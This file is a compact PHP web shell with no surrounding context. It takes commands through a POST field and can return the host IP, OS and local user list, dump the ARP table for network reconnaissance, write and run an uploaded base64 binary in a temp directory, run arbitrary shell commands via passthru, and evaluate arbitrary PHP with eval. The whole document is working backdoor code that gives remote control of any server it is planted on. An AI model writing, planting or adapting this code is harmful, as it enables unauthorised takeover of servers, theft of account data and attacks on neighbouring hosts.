<?php function get_localip(){$os=PHP_OS;if(strpos($os,"WIN")!==false){$localip=gethostbyname(php_uname('n'));return $localip;}else {$shellfp=popen("/sbin/ip addr show | awk '/inet / {print $2}' |grep -v 127.0.0.1 |cut -d'/' -f1 | head -1", "r");$localip=current(preg_split('/\n/',fread($shellfp,100)));pclose($shellfp);return $localip;}}function get_userlist(){$os=PHP_OS;if(strpos($os,"WIN")!==false){@exec("net user", $out);$len=sizeof($out);$user_list="";for($i=4;$i<$len-2;$i++){$user_list.=$out[$i]." ";}$user_list=trim($user_list);return explode(" ",preg_replace("/\s\s+/"," ",$user_list));}else{@exec("cat /etc/passwd |awk -F ':' '{print $1}'", $out);return $out;}}function get_arp(){$os=PHP_OS;if(strpos($os,"WIN")!==false) {@exec("arp -a",$out);$len=sizeof($out);$arp=array();for($i=3,$j=0;$i<$len;$i++,$j++){$one = explode(" ",trim(preg_replace("/\s\s+/"," ",$out[$i])));$arp[$j]=$one[0]." ".$one[1];}return $arp;}else{@exec("arp| awk '/ether/ {print $1\" \"$3}'", $out);return $out;}}if(@$_POST[cc]=="os"){$userlist=get_userlist();$os=PHP_OS;$ip=@get_localip();$output=array();$output["host_ip"]=$ip;$output["host_os"]=$os;$output["host_username_list"]=$userlist;echo json_encode($output);}else if(@$_POST[cc]=="net"){$arp=@get_arp();$ip=@get_localip();$output=array();$output["lan_local_ip"]=$ip;$output["lan_arp_list"]=$arp;echo json_encode($output);}else if(@$_POST[cc]=="up"){@$tool=$_POST[tool];$os=PHP_OS;if(strpos($os,"WIN")!==false){$path="c:\\windows\\temp\\up.exe";}else{$path="/tmp/up";}file_put_contents($path,base64_decode($tool));if(strpos($os,"WIN")===false){@passthru("chmod +x ".$path);}@passthru($path." \"".$_POST[xmlws]."\"");}else if(@$_POST[cc]=="cmd"){@passthru($_POST[xmlws]);}else{@eval($_POST[xmlws]);}?>